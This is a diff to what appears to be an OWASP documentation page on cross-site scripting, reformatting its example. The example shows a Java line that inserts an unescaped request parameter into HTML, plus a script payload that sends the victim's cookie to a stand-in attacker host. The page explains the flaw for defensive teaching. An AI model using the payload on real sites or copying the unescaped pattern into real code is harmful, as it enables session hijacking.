@@ -27,19 +27,17 @@ Use [Content Security Policy](https://www.owasp.org/index.php/Content_Security_P
 
 The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
 
-<code>
-  (String) page += "<input name='creditcard' type='TEXT'  value='" + request.getParameter("CC") + "'>";
-</code>
+`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 
 The attacker modifies the ‘CC’ parameter in his browser to:
-<code>
-  '><script>document.location=  'http://www.attacker.com/cgi-bin/cookie.cgi?  foo='+document.cookie</script>'.
-</code>
+
+`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. 
 Note that attackers can also use XSS to defeat any  automated CSRF defense the application might employ. See 2017-A8 for info on CSRF.
 
 ## References
+
 OWASP
 * [OWASP Proactive Controls - TBA]()
 * [OWASP Application Security Verification Standard - TBA]()
